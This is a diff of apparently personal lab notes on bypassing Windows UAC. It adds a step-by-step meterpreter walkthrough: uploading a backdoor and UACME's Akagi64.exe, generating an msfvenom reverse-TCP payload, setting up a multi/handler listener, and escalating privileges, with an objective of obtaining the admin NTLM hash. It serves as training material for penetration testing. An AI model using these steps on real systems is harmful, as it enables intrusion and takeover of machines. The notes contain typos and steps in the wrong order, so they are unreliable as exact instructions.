@@ -342,6 +342,10 @@ UAC on windows system
 - open CMD in windows: net users 
 - check members of the group: net localgroup administrators 
 
+Tool: https://github.com/hfiref0x/UACME 
+In order to elevate privileges by bypassing UAC, you will need access to a user that is a member of the local administrators group
+
+---
 
 How to bypass UAC
 - perform nmap scan on target 
@@ -354,6 +358,34 @@ How to bypass UAC
 		- pgrep explorer (to find processid for explorer.exe)
 		- migrate 2448 (we want to migrate to explorer session and get a 64bit meterpeter session)
 		- sysinfo 
+	- part 2
+		- pwd 
+		- getuid
+		- getpr (to check that you still don't have privileges)
+		- cd C:// 
+		- mkdir Temp (best location for exploit code, don't upload to locations that are frequently accessed by users )
+		- cd temp 
+		- upload backdoor.exe
+		- upload /root/Desktop/tools/UACME/Akagi64.exe 
+		- right now we cannot execute these files with administrator privileges because UAC will prevent us so we need to Bypass uac
+	- .\Akagi64.exe 23 c:\Temp\\backdoor.exe 
+		- now go back to listener 
+	- new tab in meterpeter 
+		- Generate payload:  msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe > backdoor.exe
+		- set up listernet with msfconsole (new metasploit session)
+			- set up multihandler to receive the connection once the payload is executed on the target 
+			- use multi/handler 
+			- set payload windows/meterpreter/revers_tcp
+			- set LHOST to kali ip and LPORT to 1234
+			- run and now go back to other meterpreter session (part 2)
+	- after running akigai you should see stage being sent 
+	- run sysinfo 
+	- run getuid 
+	- get privs (no you see you have elevated privileges even though you are an admin account and not administrator)
+		- ps (list process tree)
+			- you can migrate to any other services: migrate processid 
+			- getuid 
+
 
 ![[Pasted image 20230705214848.png]]
 		Now we are admin, who  is not administrator but part of the local administrators group 
@@ -362,9 +394,19 @@ How to bypass UAC
 	- netuser (shows all the users)
 	- net localgroup administrators ![[Pasted image 20230705215644.png]] we see that administrator is part of a the group which means that this user can essentially execute programs with elevated privileges but to do that we need to bypass UAC 
 
-- 
 
 
+----
+
+Lab 
+
+**UACME:**
+- Defeat Windows User Account Control (UAC) and get Administrator privileges.
+- It abuses the built-in Windows AutoElevate executables.
+- It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
+- Developed by https://twitter.com/hFireF0X
+
+**Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.
 
 
 
